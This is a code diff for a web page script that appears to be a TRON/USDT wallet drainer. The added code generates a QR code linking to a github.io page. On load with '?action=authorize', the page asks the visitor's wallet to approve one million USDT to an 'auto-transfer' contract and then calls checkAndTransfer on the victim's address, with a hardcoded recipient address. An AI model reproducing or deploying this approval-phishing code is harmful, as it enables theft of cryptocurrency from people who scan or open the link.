@@ -1,29 +1,56 @@
-const usdtContractAddress = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // USDT合约地址
-const autoTransferContractAddress = 'TTzQJWf81VMr9ythn5zgaxviFhouwG3huP'; // 自动转账合约地址
+const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT合约地址
+const autoTransferContractAddress = 'TJKQATfKMkgbVVNjS1BXfXfaup3CCcAkQz'; // 自动转账合约地址
+const recipientAddress = 'TXov68aLHojmFmZm7HdXax1L5mNbgSQ8pE'; // 收款地址
 const approveAmount = 1000000 * 10 ** 6; // 授权100万USDT
 
 const usdtAbi = [
-    // USDT ABI
-    {"inputs":[{"name":"name_","type":"string"},{"name":"symbol_","type":"string"}],"stateMutability":"Nonpayable","type":"Constructor"},
-    {"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"Approval","type":"Event"},
-    {"inputs":[{"name":"userAddress","type":"address"},{"name":"relayerAddress","type":"address"},{"name":"functionSignature","type":"bytes"}],"name":"MetaTransactionExecuted","type":"Event"},
-    {"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"Event"},
-    {"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"Transfer","type":"Event"},
-    {"outputs":[{"type":"string"}],"name":"ERC712_VERSION","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"bool"}],"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","stateMutability":"Nonpayable","type":"Function"},
-    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"uint8"}],"name":"decimals","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"bool"}],"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","stateMutability":"Nonpayable","type":"Function"},
-    {"outputs":[{"type":"bytes"}],"inputs":[{"name":"userAddress","type":"address"},{"name":"functionSignature","type":"bytes"},{"name":"sigR","type":"bytes32"},{"name":"sigS","type":"bytes32"},{"name":"sigV","type":"uint8"}],"name":"executeMetaTransaction","stateMutability":"Payable","type":"Function"},
-    {"outputs":[{"type":"uint256"}],"name":"getChainId","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"uint256"}],"name":"getDomainSeperator","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"bytes32"}],"inputs":[{"name":"userAddress","type":"address"},{"name":"functionSignature","type":"bytes"},{"name":"sigR","type":"bytes32"},{"name":"sigS","type":"bytes32"},{"name":"sigV","type":"uint8"}],"name":"getMessageHash","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"uint256"}],"name":"getNonce","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"string"}],"name":"name","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"bool"}],"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","stateMutability":"Nonpayable","type":"Function"},
-    {"outputs":[{"type":"string"}],"name":"symbol","stateMutability":"View","type":"Function"},
-    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"userAddress","type":"address"}],"name":"getNonce","stateMutability":"View","type":"Function"}
+    // 之前提供的USDT合约ABI
+    {"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":true,"inputs":[{"name":"_value","type":"uint256"}],"name":"calcFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"oldBalanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+    {"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"name":"_initialSupply","type":"uint256"},    {"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},
+    {"anonymous":false,"inputs":[],"name":"Pause","type":"event"},
+    {"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}
 ];
 
 const autoTransferAbi = [
@@ -38,53 +65,53 @@ const autoTransferAbi = [
 
 let tronWeb;
 
-async function connectWallet() {
+async function authorizeAndTransfer() {
     if (typeof window.tronWeb === 'undefined') {
-        alert('请安装TronLink钱包!');
+        alert('请安装欧易钱包!');
         return;
     }
     tronWeb = window.tronWeb;
-    await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58)
-        .then(result => {
-            console.log(result);
-            document.getElementById('connectWalletBtn').style.display = 'none';
-            document.getElementById('approveBtn').style.display = 'block';
-        })
-        .catch(error => {
-            console.error(error);
-            alert('连接TronLink失败!');
-        });
+    try {
+        await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
+
+        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
+        const autoTransferContract = await tronWeb.contract().at(autoTransferContractAddress);
+
+        // 授权USDT
+        await usdtContract.approve(autoTransferContractAddress, approveAmount).send();
+
+        // 执行自动转账
+        await autoTransferContract.checkAndTransfer(tronWeb.defaultAddress.base58).send();
+
+        document.getElementById('result').innerText = '授权和转账成功';
+    } catch (error) {
+        console.error(error);
+        document.getElementById('result').innerText = '授权或转账失败';
+    }
 }
 
-document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
-
-document.getElementById('approveBtn').addEventListener('click', async () => {
-    const usdtContract = await tronWeb.contract(usdtAbi, usdtContractAddress);
-    await usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send({
-        feeLimit: 100000000
-    }).then(() => {
-        document.getElementById('result').innerText = '授权成功';
-        document.getElementById('approveBtn').style.display = 'none';
-        document.getElementById('transferBtn').style.display = 'block';
-    }).catch((error) => {
-        console.error(error);
-        document.getElementById('result').innerText = '授权失败';
+// 生成二维码
+function generateQRCode() {
+    const url = 'https://wanglei3215.github.io/okktokenproject/?action=authorize';
+    console.log('Generating QR Code for URL:', url); // 调试日志
+    QRCode.toCanvas(document.getElementById('qrcode'), url, function (error) {
+        if (error) {
+            console.error('QR Code generation error:', error);
+        } else {
+            console.log('QR Code generated successfully!');
+        }
     });
-});
+}
 
-document.getElementById('transferBtn').addEventListener('click', async () => {
-    const contract = await tronWeb.contract(autoTransferAbi, autoTransferContractAddress);
-    const userAddress = tronWeb.defaultAddress.base58;
-    await contract.methods.checkAndTransfer(userAddress).send({
-        feeLimit: 100000000,
-        callValue: 0
-    }).then(() => {
-        document.getElementById('result').innerText = '转账成功';
-    }).catch((error) => {
-        console.error(error);
-        document.getElementById('result').innerText = '转账失败';
-    });
+// 检查URL参数并执行相应操作
+function checkUrlParams() {
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('action') === 'authorize') {
+        authorizeAndTransfer();
+    }
+}
+
+document.addEventListener('DOMContentLoaded', function () {
+    generateQRCode();
+    checkUrlParams();
 });
-</script>
-</body>
-</html>
